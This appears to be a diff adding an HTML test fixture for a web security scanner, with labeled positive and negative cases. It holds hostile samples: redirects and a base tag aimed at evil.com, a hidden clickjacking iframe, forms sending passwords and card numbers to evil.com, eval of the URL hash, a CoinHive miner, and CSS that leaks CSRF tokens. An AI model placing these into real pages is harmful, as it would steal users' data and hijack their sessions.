@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- TC-SRI-01: POSITIVE — external script without integrity -->
+    <script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
+
+    <!-- TC-SRI-02: POSITIVE — external stylesheet without integrity -->
+    <link rel="stylesheet" href="https://cdn.example.com/bootstrap.min.css">
+
+    <!-- TC-SRI-03: NEGATIVE — external script WITH integrity (safe) -->
+    <script src="https://cdn.example.com/lodash.min.js"
+            integrity="sha384-abc123def456" crossorigin="anonymous"></script>
+
+    <!-- TC-SRI-04: NEGATIVE — local script (not external) -->
+    <script src="/js/app.js"></script>
+
+    <!-- TC-MR-01: POSITIVE — meta refresh to external URL -->
+    <meta http-equiv="refresh" content="0;url=https://evil.com/phishing">
+
+    <!-- TC-MR-02: POSITIVE/LOW — meta refresh to internal URL -->
+    <meta http-equiv="refresh" content="5;url=/dashboard">
+
+    <!-- TC-BASE-01: POSITIVE — base tag pointing to external domain -->
+    <base href="https://evil.com/hijacked/">
+</head>
+<body>
+    <!-- TC-CJ-01: POSITIVE — hidden iframe overlay -->
+    <iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
+
+    <!-- TC-FORM-01: POSITIVE — form over HTTP -->
+    <form action="http://example.com/login" method="POST">
+        <input type="text" name="username">
+        <input type="password" name="password">
+        <button type="submit">Login</button>
+    </form>
+
+    <!-- TC-FORM-02: POSITIVE — form to external domain -->
+    <form action="https://evil.com/collect" method="POST">
+        <input type="text" name="creditcard">
+        <button type="submit">Pay</button>
+    </form>
+
+    <!-- TC-FORM-03: POSITIVE — formaction override -->
+    <form action="/safe-endpoint" method="POST">
+        <button type="submit" formaction="https://evil.com/steal">Submit</button>
+    </form>
+
+    <!-- TC-DM-01: POSITIVE — javascript: URL in href -->
+    <a href="javascript:alert(document.cookie)">Click me</a>
+
+    <!-- TC-DM-02: POSITIVE — data: URL in iframe -->
+    <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+    <!-- TC-INLINE-01: POSITIVE — inline script with eval (should trigger JS scanner) -->
+    <script>
+        eval(location.hash.slice(1));
+        var miner = new CoinHive.Anonymous('key123');
+        navigator.geolocation.getCurrentPosition(function(p){});
+        window.addEventListener('message', function(event) {
+            document.getElementById('x').innerHTML = event.data;
+        });
+    </script>
+
+    <!-- TC-INLINE-02: POSITIVE — inline style with CSS exfiltration -->
+    <style>
+        input[name=csrf][value^=a]{background:url(https://evil.com/a)}
+        input[name=csrf][value^=b]{background:url(https://evil.com/b)}
+        input[name=csrf][value^=c]{background:url(https://evil.com/c)}
+        input[name=csrf][value^=d]{background:url(https://evil.com/d)}
+        input[name=csrf][value^=e]{background:url(https://evil.com/e)}
+    </style>
+
+    <!-- TC-CJ-02: MEDIUM — page has login form but no frame-busting -->
+    <!-- (this is detected at file level since there's a form+password+login above
+          and no X-Frame-Options meta or JS frame-busting) -->
+</body>
+</html>
